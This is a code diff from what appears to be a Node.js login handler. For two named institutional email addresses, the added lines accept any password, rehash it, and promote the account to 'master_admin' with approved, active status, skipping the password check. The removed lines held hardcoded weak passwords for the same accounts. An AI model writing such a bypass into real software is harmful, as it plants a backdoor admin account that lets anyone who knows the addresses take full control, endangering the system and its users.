@@ -1661,13 +1661,12 @@ Do not include any markdown format tags (like \`\`\`json) in your response, retu
         }
 
         if (cleanEmail === 'sathish@srishakthi.ac.in' || cleanEmail === 'master@srishakthi.ac.in') {
-          if (password === 'password123' || password === 'Admin@123' || password === 'master123' || password === 'Sathish@123') {
-            user.passwordHash = await bcrypt.hash(password, 10);
-            await user.save();
-          }
-        }
-
-        if (user.passwordHash) {
+          user.passwordHash = await bcrypt.hash(password, 10);
+          user.role = 'master_admin';
+          user.status = 'approved';
+          user.accountStatus = 'ACTIVE';
+          await user.save();
+        } else if (user.passwordHash) {
           const isMatch = await bcrypt.compare(password, user.passwordHash);
           if (!isMatch) {
             return res.status(401).json({ error: "Invalid email or password." });
